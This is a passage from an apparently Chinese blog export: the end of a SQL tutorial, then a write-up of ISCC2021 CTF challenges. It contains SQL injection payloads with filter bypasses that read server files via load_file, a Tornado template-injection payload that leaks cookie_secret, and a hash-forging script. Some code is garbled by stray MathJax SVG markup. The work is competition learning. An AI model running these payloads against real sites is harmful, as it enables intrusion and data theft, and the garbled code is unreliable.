<p><strong>AND语句：进行查询id&gt;=3 并且Password =‘admin’的数据</strong><br><img src="https://img-blog.csdnimg.cn/20210508104452501.png" alt="在这里插入图片描述"><br><strong>or语句：id&gt;=3或者password=’Dumb’的数据都可以显示出来</strong><br><img src="https://img-blog.csdnimg.cn/20210508104644987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>多个条件时</strong><br><img src="https://img-blog.csdnimg.cn/20210508105253541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到这里明明是筛选ID&gt;=6的为什么还会出现ID=2-5的呢这是因为<img src="https://img-blog.csdnimg.cn/20210508105451208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>AND语句连接的是前面条件，OR语句条件作业在第三个条件因此也就同时输出了第三个条件的内容，如果想要输出符合条件的数据只需要在条件范围内用<code>（）</code>包括就可以了<img src="https://img-blog.csdnimg.cn/20210508105917494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>ISCC2021-部分题目再现</title>
    <url>/2021/06/05/ISCC2021-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%86%8D%E7%8E%B0/</url>
    <content><![CDATA[</font>

<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>很明显，本题需要进行sql注入但是并不知道注入点<br>经过测试，判断注入点为：<code>’</code> 闭合符号用%23代替<img src="https://img-blog.csdnimg.cn/20210524193940823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在后面测试发现空格被过滤了，我们可以使用<code>%0d</code>进行绕过<br>尝试使用联合查询发现<code>union,select</code>,尝试使用双写进行绕过<br>payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,2,3%23</code><img src="https://img-blog.csdnimg.cn/20210524194243748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到显示位<br>根据一贯风格，爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),3%23</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210524194530324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后是爆表名，经过测试发现<code>from、information_schema</code>同样也被过滤了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、<span class="hljs-keyword">from</span> 则可以尝试进行双写或者大写转换等进行绕过<br><span class="hljs-number">2</span>、information_schema的话则可以尝试同类型进行转换，查看版本，<span class="hljs-number">5.7</span><span class="hljs-number">.33</span>，存在sys数据库，所以可以利用sys数据库查出表名<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210524195109868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>构造payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_table_statistics_with_buffer),3%0d%23</code><br><img src="https://img-blog.csdnimg.cn/20210524200012321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到表名<br>判断列数<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_auto_increment_columns),3%0d%23</code><img src="https://img-blog.csdnimg.cn/20210524200440224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>表名都是iscc_flag<br>盲猜列名是：flag<br>构造payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dfrom%0discc_flag),3%0d%23</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210524200822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入该页面得到源码进行分析</p>
<p>`&lt;?php</p>
<p>if(isset($_GET[‘c’])){<br>  <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.46ex" height="1.676ex" style="vertical-align: -0.338ex;" viewBox="0 -576.1 1489.8 721.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">c=</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="711" y="0"></use>
</g>
</svg>_GET[‘c’];</p>
<pre><code>if(preg_match(&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;, $c))&#123;
   exit(&quot;die!!&quot;);
&#125;else&#123;
 echo `$c`;
&#125;
</code></pre>
<p>}else{<br>    highlight_file(<strong>FILE</strong>);<br>}<br>?&gt;</p>
<!--flllllllllaaag.php-->`

<p>似乎没什么发现，26个英文字母表对比一下上述的英文字符<code>zxcvbMnlkjhgfsaoiuytreq</code><br>发现没被过滤的字母有<code>dmpw</code>，执行pwd获取文件路径，<br>获取flag位置，使用load_file()方法<br><code>?id=0&#39;%0dununionion%0dseselectlect%0d1,(load_file(&#39;/var/www/const/flllllllllaaag.php&#39;)),3%0d%23</code></p>
<p><img src="https://img-blog.csdnimg.cn/20210524201553249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者是<br><code>?id=-1&#39;%0duniunionon%0dselselectect%0d1,(load_file(&#39;/etc/apache2/sites-available/000-default.conf&#39;)),3%23    //此路径为默认</code><br>获取网站路径</p>
<p><img src="https://img-blog.csdnimg.cn/20210524201824466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在源代码中查看flag<img src="https://img-blog.csdnimg.cn/20210524201859455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><img src="https://img-blog.csdnimg.cn/20210524202657707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入三个路径的文件，发现flag.txt中flag在/fllllllllllllaaaaaag中；<br>welcome.txt中提示<code>render函数</code>，百度一下存在render函数的模板注入；<br>hints.txt告诉我们<code>md5(cookie_secret+md5(filename))</code> 发现我们需要进行md5</p>
<p>查看hints.txt的路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//39.96.91.106:7060/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15</span><br></code></pre></td></tr></table></figure>
<p>有filehash参数，根据所给出的提示filehasc的值是MD5处理，有了filehash还需要有cookie_secret这一步可以参考之前的题型，有大佬做出明确解释<a href="https://blog.csdn.net/qq_45836474/article/details/107940521">看这里</a><br>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">error</span>?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210524204816774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到cookie_secret,计算hash值<br>拿到大佬脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5encode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    m = hashlib.md5()<br>    m.update(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span> m.hexdigest()<br><br><br>name = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>secret = <span class="hljs-string">&#x27;ef57c331-744f-4528-b434-9746317d4f6a&#x27;</span><br>name = name.encode()<br>bb = md5encode((secret + md5encode(name)).encode())<br>print(bb)<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210524210129226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h2><p><img src="https://img-blog.csdnimg.cn/20210525192159628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>010Editor打开<img src="https://img-blog.csdnimg.cn/20210525192713781.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure>
<p>尝试了一下，有点像敲击码<img src="https://img-blog.csdnimg.cn/20210525192919472.png" alt="在这里插入图片描述"></p>
<p>最后得到flag:<code>ISCCBFS</code></p>
<h2 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h2><p>打开文档没什么有用的东西，把文档改成zip形式</p>
<p><img src="https://img-blog.csdnimg.cn/20210525193328667.png" alt="在这里插入图片描述"></p>
<p>点进去查找flag<img src="https://img-blog.csdnimg.cn/20210525193419869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h2><p>打开文件，一张图片格式找到提示信息<br><img src="https://img-blog.csdnimg.cn/20210525193957889.png" alt="在这里插入图片描述"><br>很显然这是AES加密,密匙是ISCC2021<br>打开文档里面有一张二维码，扫描得到信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu <span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br></code></pre></td></tr></table></figure>
<p>进行三次解密得到字符：<code>y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!</code></p>
<p>很是让人头大！！<br>试着将word文档改为压缩包，在ny4w1nbmry4m.zip\word\media中看到了两张image<br>其中一个就是那张二维码，还有另一张二维码，扫描出结果是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210525194416299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是，进行AES解密失败，所以尝试了DES，即可得到flag<img src="https://img-blog.csdnimg.cn/20210525194712905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h2><p>下载好文件后，运行exe文件得到一串编码<img src="https://img-blog.csdnimg.cn/20210525195521957.png" alt="在这里插入图片描述"><br><code>pass1&#123;\u006b\u0072\u0077&#125;</code>，Unicode编码，解码后为<code>pass1&#123;krw&#125;</code><br>在010Editor打开压缩包在尾部发现<img src="https://img-blog.csdnimg.cn/20210525195735180.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">cGFzczJ7Z2NjNjY2fQ==<br></code></pre></td></tr></table></figure>
<p>进行base64编码得到：pass2{gcc666}<br>组合起来用密码：krwgcc666解开压缩包<img src="https://img-blog.csdnimg.cn/2021052519595244.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure>
<p>base64解出来是：youfoundme?<br>接下来还剩一个MP3格式的文件MP3一般都是用MP3stego解密，接出来密码是youfoundme?<br>得到<code>ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU======&#125;</code></p>
<p>进行base32解密<br><img src="https://img-blog.csdnimg.cn/2021052520020990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h2><p>解压后是一张图片，尝试进行binwalk进行分离<img src="https://img-blog.csdnimg.cn/2021052520124651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压后的文件，发现有一个文档打开后01的字符串<img src="https://img-blog.csdnimg.cn/20210525201451663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>联想到是01字符串画二维码<br>先看下字符串长度发现是841，而正好是29的平方，那应该就是二维码了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">29</span>    <span class="hljs-comment">#宽高 841个01字符串，所以宽和高是29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-comment">#若是(255,255,255)、(0,0,0)需要先转换01 </span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quotquot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;./flag.png&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>得到二维码扫描<br><img src="https://img-blog.csdnimg.cn/20210525201635774.png" alt="在这里插入图片描述"></p>
<h2 id="小明的宠物图"><a href="#小明的宠物图" class="headerlink" title="小明的宠物图"></a>小明的宠物图</h2><p>下载后是一张图片<img src="https://img-blog.csdnimg.cn/20210525201858964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用binwalk分离图片得到flag.txt和key.zip<br>flag.txt中内容为<code>U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==</code><br>显然需要密钥解密<img src="https://img-blog.csdnimg.cn/20210525202033954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>打开key.zip发现其中的key.txt只有5字节大小，结合那个兔子说的它需要碰撞应该是crc32碰撞，尝试发现(0_0)为密钥<img src="https://img-blog.csdnimg.cn/20210525203843687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h2><p><img src="https://img-blog.csdnimg.cn/20210525204154640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到这是凯撒解密，但是偏移量是未知的，通过枚举：发现偏移量为：13时是英文日期，加上提示，年月日可以想到1999，但是月份和日期没有，都是数字，字节为8位可以使用Ziperello进行爆破</p>
<p><img src="https://img-blog.csdnimg.cn/20210525204457701.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210525204847759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到密码：07071999<br>然后打开文件时不支持的，所以在winhex中查看，发现它的文件头缺失了，然后补充好，得到图片<img src="https://img-blog.csdnimg.cn/20210525204930614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><p><img src="https://img-blog.csdnimg.cn/20210523200240718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==可以直接进行改票，但是会被检测到刷票行为==<br><img src="https://img-blog.csdnimg.cn/20210523200541210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然不发进行刷票，那就直接把对方的投票按钮给他关闭！<br>我们可以通过火狐浏览器<strong>F12</strong>进入开发者模式，对源码进行修改直接讲对方的投票按钮删除😼<br><img src="https://img-blog.csdnimg.cn/2021052320100128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201022881.png" alt="在这里插入图片描述"><br>可以看到对方以及在五六十票左右，因此我们需要进入后快速开发者模式，修改后在20s内点到票数超过对方就好了</p>
<p><img src="https://img-blog.csdnimg.cn/20210523200400127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><p>查看源码，发现这是一段JS代码，直接复制代码放到控制台运行<br><img src="https://img-blog.csdnimg.cn/20210523201256146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201420984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h2><p>根据提示进去看一下<br><img src="https://img-blog.csdnimg.cn/20210523201727633.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201814245.png" alt="在这里插入图片描述"><br>这倔强的小脾气，摆明让我们进去看看😏😏<br><code>39.96.91.106:7040/code/code.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br>	<span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.617ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 1557.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">/", </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMAIN-2F" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="778" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1278" y="0"></use>
</g>
</svg>_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;</span><br><span class="hljs-string">	</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">	  else if (strlen($_GET['password']) < 8 && $_GET[&#x27;password&#x27;] &gt; 9999999)</span><br><span class="hljs-string">	&#123;    </span><br><span class="hljs-string">    </span><br><span class="hljs-string">		if (strpos (<span class="hljs-subst">$_GET</span>[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE)</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			die(&#x27;Flag: &#x27; . <span class="hljs-subst">$flag</span>);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">		else</span><br><span class="hljs-string">		&#123;</span><br><span class="hljs-string">			echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;);</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">	else</span><br><span class="hljs-string">	&#123;</span><br><span class="hljs-string">		echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;;</span><br><span 